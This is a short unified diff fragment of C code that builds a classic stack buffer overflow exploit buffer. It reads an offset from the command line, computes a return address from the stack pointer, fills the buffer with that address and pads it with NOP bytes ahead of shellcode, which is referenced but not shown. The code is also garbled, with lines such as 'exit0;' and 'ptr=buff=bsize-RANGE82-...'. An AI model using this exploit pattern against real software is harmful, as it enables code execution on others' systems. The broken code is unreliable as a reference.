@@ -27,4 +27,25 @@ main(int argc,char* argv[])
 	 
 	 if(argc<1)
 	 {
-}
+	 	printf("There where no offset\n");
+	 	exit0;
+	 }
+	 offset=atoi(argv[1]);
+	 sp=get_ps();
+	 ret=sp-offset;
+	 
+	 printf("The stack pointer is: 0x%x\n",sp);
+	 printf("The offset is: 0x%x\n",offset);
+	 printf("Ret_addr is: 0x%x\n",ret);
+	 
+	 for(i=0;i<bsize;i+=4)
+	 {
+	 	*(long *)&buff[i]=ret;
+	 }
+for(i=0;i<bsize-RANGE*2-strlen(shellcode)-1;i++)
+		buff[i]='\x90';
+		
+	ptr=buff=bsize-RANGE82-strlen(shellcode)-1;
+	
+	 }
+	 
